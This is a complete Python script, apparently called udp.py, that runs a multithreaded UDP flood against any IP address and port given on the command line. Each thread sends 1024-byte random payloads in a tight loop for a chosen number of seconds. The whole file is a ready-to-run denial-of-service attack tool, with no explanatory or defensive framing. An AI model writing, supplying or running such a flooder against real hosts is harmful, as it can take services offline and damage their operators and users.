import socket
import threading
import time
import sys
import random

def generate_random_string(length):
    letter_bytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    return ''.join(random.choice(letter_bytes) for _ in range(length))

def udp_flood(target_ip, target_port, payload, duration):
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    timeout = duration / 1
    end_time = time.time() + timeout
    while time.time() < end_time:
        udp_socket.sendto(payload, (target_ip, target_port))
    udp_socket.close()

def main():
    if len(sys.argv) != 5:
        print("Usage: python udp.py <target_ip> <target_port> <num_threads> <duration>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    num_threads = int(sys.argv[3])
    duration = int(sys.argv[4])
    payload = generate_random_string(1024).encode()

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, payload, duration))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
